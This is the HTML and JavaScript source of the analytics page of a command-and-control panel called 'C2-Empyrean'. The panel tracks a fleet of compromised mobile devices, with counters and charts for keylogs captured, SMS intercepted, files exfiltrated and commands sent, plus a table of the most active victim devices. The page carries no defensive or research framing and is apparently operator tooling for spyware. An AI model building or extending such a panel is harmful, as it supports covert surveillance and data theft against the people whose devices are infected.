<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Analytics - C2-Empyrean</title>
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
        }
        .app-container { display: flex; min-height: 100vh; }
        .sidebar {
            width: 260px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 16px;
            position: fixed;
            top: 0; left: 0;
            height: 100vh;
            overflow-y: auto;
            z-index: 100;
        }
        .sidebar-logo {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px; padding: 0 12px;
        }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 4px; }
        .sidebar-nav a {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; color: rgba(255, 255, 255, 0.5);
            text-decoration: none; border-radius: 10px;
            font-size: 14px; font-weight: 500; transition: all 0.2s ease;
        }
        .sidebar-nav a:hover { background: rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); }
        .sidebar-nav a.active { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .sidebar-nav .icon { width: 20px; text-align: center; font-size: 16px; }
        .sidebar-divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.05); margin: 16px 12px; }
        .sidebar-section-title { color: rgba(255, 255, 255, 0.2); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; padding: 8px 12px; }

        .main-content {
            margin-left: 260px; flex: 1;
            padding: 28px 32px;
            max-width: calc(100vw - 260px);
        }
        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .page-title { font-size: 28px; font-weight: 700; color: #fff; }
        .page-title span { font-size: 14px; font-weight: 400; color: rgba(255, 255, 255, 0.3); }
        .header-actions { display: flex; gap: 12px; }
        .header-btn {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); font-size: 13px;
            cursor: pointer; transition: all 0.2s;
        }
        .header-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 28px;
        }
        .stat-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 20px;
        }
        .stat-card .stat-icon { font-size: 28px; margin-bottom: 8px; }
        .stat-card .stat-value { font-size: 32px; font-weight: 700; color: #fff; }
        .stat-card .stat-label { font-size: 13px; color: rgba(255, 255, 255, 0.4); margin-top: 4px; }
        .stat-card .stat-change { font-size: 12px; margin-top: 8px; }
        .stat-card .stat-change.up { color: #34c759; }
        .stat-card .stat-change.down { color: #ff453a; }

        .chart-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 28px;
        }
        .chart-card {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 20px;
        }
        .chart-card.full-width { grid-column: 1 / -1; }
        .chart-card .chart-title { font-size: 14px; font-weight: 600; color: rgba(255, 255, 255, 0.5); margin-bottom: 16px; }
        .chart-card canvas { width: 100% !important; height: 250px !important; }

        .top-devices table { width: 100%; border-collapse: collapse; }
        .top-devices th {
            text-align: left; padding: 10px 12px;
            font-size: 12px; color: rgba(255, 255, 255, 0.3);
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
        }
        .top-devices td {
            padding: 10px 12px; font-size: 13px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
            color: rgba(255, 255, 255, 0.7);
        }

        @media (max-width: 768px) {
            .sidebar { display: none; }
            .main-content { margin-left: 0; max-width: 100%; padding: 20px; }
            .chart-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <nav class="sidebar">[sidebar content same as other pages with .active on analytics]</nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">📈 Analytics <span>fleet statistics</span></h1>
                <div class="header-actions">
                    <button class="header-btn" onclick="refreshAnalytics()">🔄 Refresh</button>
                    <select class="filter-select" id="rangeSelect" onchange="refreshAnalytics()" style="padding:8px 12px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:8px;color:#fff;font-size:13px;">
                        <option value="24h">Last 24h</option>
                        <option value="7d">Last 7 days</option>
                        <option value="30d">Last 30 days</option>
                        <option value="all">All time</option>
                    </select>
                </div>
            </div>

            <div class="stats-grid" id="statsGrid">
                <div class="stat-card"><div class="stat-icon">📱</div><div class="stat-value" id="totalDevices">—</div><div class="stat-label">Total Devices</div><div class="stat-change up" id="deviceChange"></div></div>
                <div class="stat-card"><div class="stat-icon">🟢</div><div class="stat-value" id="onlineNow">—</div><div class="stat-label">Online Now</div></div>
                <div class="stat-card"><div class="stat-icon">⚡</div><div class="stat-value" id="totalCommands">—</div><div class="stat-label">Commands Sent</div></div>
                <div class="stat-card"><div class="stat-icon">⌨️</div><div class="stat-value" id="totalKeylogs">—</div><div class="stat-label">Keylogs Captured</div></div>
                <div class="stat-card"><div class="stat-icon">💬</div><div class="stat-value" id="totalSms">—</div><div class="stat-label">SMS Intercepted</div></div>
                <div class="stat-card"><div class="stat-icon">📁</div><div class="stat-value" id="totalFiles">—</div><div class="stat-label">Files Exfiltrated</div></div>
            </div>

            <div class="chart-grid">
                <div class="chart-card full-width">
                    <div class="chart-title">Devices Over Time</div>
                    <canvas id="devicesChart"></canvas>
                </div>
                <div class="chart-card">
                    <div class="chart-title">Commands by Type</div>
                    <canvas id="commandsChart"></canvas>
                </div>
                <div class="chart-card">
                    <div class="chart-title">Data Collected (MB)</div>
                    <canvas id="dataChart"></canvas>
                </div>
            </div>

            <div class="chart-card" style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:20px;">
                <div class="chart-title" style="font-size:14px;font-weight:600;color:rgba(255,255,255,0.5);margin-bottom:16px;">🏆 Top Devices</div>
                <div class="top-devices">
                    <table>
                        <thead><tr><th>Device</th><th>Model</th><th>Commands</th><th>Keylogs</th><th>Data</th><th>Last Active</th></tr></thead>
                        <tbody id="topDevicesBody"><tr><td colspan="6" style="text-align:center;color:rgba(255,255,255,0.2);padding:30px;">Loading...</td></tr></tbody>
                    </table>
                </div>
            </div>
        </main>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
    <script>
        let devicesChartInstance = null;
        let commandsChartInstance = null;
        let dataChartInstance = null;

        document.addEventListener('DOMContentLoaded', refreshAnalytics);

        async function refreshAnalytics() {
            const range = document.getElementById('rangeSelect').value;
            try {
                const response = await fetch(`/api/analytics/stats?range=${range}`, {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await response.json();
                if (!result.success) {
                    if (result.code === 401) { window.location.href = '/admin/login'; return; }
                    return;
                }
                renderStats(result.data.stats || {});
                renderCharts(result.data.charts || {});
                renderTopDevices(result.data.top_devices || []);
            } catch (err) {}
        }

        function renderStats(stats) {
            document.getElementById('totalDevices').textContent = stats.total_devices || 0;
            document.getElementById('onlineNow').textContent = stats.online_now || 0;
            document.getElementById('totalCommands').textContent = stats.total_commands || 0;
            document.getElementById('totalKeylogs').textContent = stats.total_keylogs || 0;
            document.getElementById('totalSms').textContent = stats.total_sms || 0;
            document.getElementById('totalFiles').textContent = stats.total_files || 0;
        }

        function renderCharts(charts) {
            if (charts.devices_over_time) {
                if (devicesChartInstance) devicesChartInstance.destroy();
                devicesChartInstance = new Chart(document.getElementById('devicesChart'), {
                    type: 'line',
                    data: {
                        labels: charts.devices_over_time.labels || [],
                        datasets: [{
                            label: 'Devices',
                            data: charts.devices_over_time.data || [],
                            borderColor: '#7b2ff7',
                            backgroundColor: 'rgba(123, 47, 247, 0.1)',
                            fill: true,
                            tension: 0.4
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: { legend: { labels: { color: 'rgba(255,255,255,0.5)' } } },
                        scales: {
                            x: { ticks: { color: 'rgba(255,255,255,0.3)' }, grid: { color: 'rgba(255,255,255,0.03)' } },
                            y: { ticks: { color: 'rgba(255,255,255,0.3)' }, grid: { color: 'rgba(255,255,255,0.03)' } }
                        }
                    }
                });
            }
            if (charts.commands_by_type) {
                if (commandsChartInstance) commandsChartInstance.destroy();
                commandsChartInstance = new Chart(document.getElementById('commandsChart'), {
                    type: 'doughnut',
                    data: {
                        labels: charts.commands_by_type.labels || [],
                        datasets: [{
                            data: charts.commands_by_type.data || [],
                            backgroundColor: ['#7b2ff7', '#00d4ff', '#ff9f0a', '#34c759', '#ff453a', '#5e5ce6']
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: {
                            legend: { position: 'bottom', labels: { color: 'rgba(255,255,255,0.5)', padding: 12 } }
                        }
                    }
                });
            }
            if (charts.data_collected) {
                if (dataChartInstance) dataChartInstance.destroy();
                dataChartInstance = new Chart(document.getElementById('dataChart'), {
                    type: 'bar',
                    data: {
                        labels: charts.data_collected.labels || [],
                        datasets: [{
                            label: 'MB',
                            data: charts.data_collected.data || [],
                            backgroundColor: '#00d4ff',
                            borderRadius: 4
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        plugins: { legend: { labels: { color: 'rgba(255,255,255,0.5)' } } },
                        scales: {
                            x: { ticks: { color: 'rgba(255,255,255,0.3)' }, grid: { color: 'rgba(255,255,255,0.03)' } },
                            y: { ticks: { color: 'rgba(255,255,255,0.3)' }, grid: { color: 'rgba(255,255,255,0.03)' } }
                        }
                    }
                });
            }
        }

        function renderTopDevices(devices) {
            const tbody = document.getElementById('topDevicesBody');
            if (!devices.length) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:rgba(255,255,255,0.2);padding:30px;">No data</td></tr>';
                return;
            }
            tbody.innerHTML = devices.map(d => `
                <tr>
                    <td style="font-family:monospace;color:#7b2ff7;">${d.device_id}</td>
                    <td>${d.model || '—'}</td>
                    <td>${d.commands || 0}</td>
                    <td>${d.keylogs || 0}</td>
                    <td>${(d.data_mb || 0).toFixed(1)} MB</td>
                    <td style="color:rgba(255,255,255,0.3);font-size:12px;">${timeAgo(d.last_seen)}</td>
                </tr>
            `).join('');
        }

        function timeAgo(ts) {
            if (!ts) return '—';
            const s = Math.floor(Date.now() / 1000 - ts);
            if (s < 60) return 'just now';
            if (s < 3600) return Math.floor(s / 60) + 'm ago';
            if (s < 86400) return Math.floor(s / 3600) + 'h ago';
            return Math.floor(s / 86400) + 'd ago';
        }

        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }
    </script>
</body>
</html>
